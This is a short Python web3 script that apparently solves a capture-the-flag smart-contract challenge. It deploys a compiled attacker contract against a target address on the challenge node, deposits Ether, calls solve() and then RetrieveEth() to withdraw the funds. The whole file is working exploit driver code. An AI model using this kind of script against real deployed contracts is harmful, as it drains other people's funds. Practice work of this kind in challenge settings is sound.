from web3 import Web3, HTTPProvider
import json
web3 = Web3(HTTPProvider(f"http://blockchain.n00bzUnit3d.xyz:41961"))
contract_address = "0x6cf153ec0520125eCb6929c33634ed56D6dB2546"
wallet = "0x0B26c994b667Ea84cA0360BE41129e924609d6F6"
web3.eth.default_account = wallet
f = open('./build/contracts/Attack.json')
contract_json = json.load(f)
abi = contract_json['abi']
bytecode = contract_json['bytecode']
attack_contract = web3.eth.contract(abi=abi, bytecode=bytecode)
tx_hash = attack_contract.constructor(contract_address).transact()
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
attack_contract_address = tx_receipt.contractAddress

deployed_attack_contract = web3.eth.contract(address=attack_contract_address, abi=abi)
print("Contract deployed at: " + attack_contract_address)
tx_hash = deployed_attack_contract.functions.deposit().transact({'value':int(1340*10e17),'gasPrice':800000000})
web3.eth.wait_for_transaction_receipt(tx_hash)
solved = deployed_attack_contract.functions.solve().transact()
web3.eth.wait_for_transaction_receipt(solved)
get_money = deployed_attack_contract.functions.RetrieveEth().transact()
web3.eth.wait_for_transaction_receipt(get_money)

print("Solved! Current balance: " + str(int(web3.eth.get_balance(wallet)/(10e17))))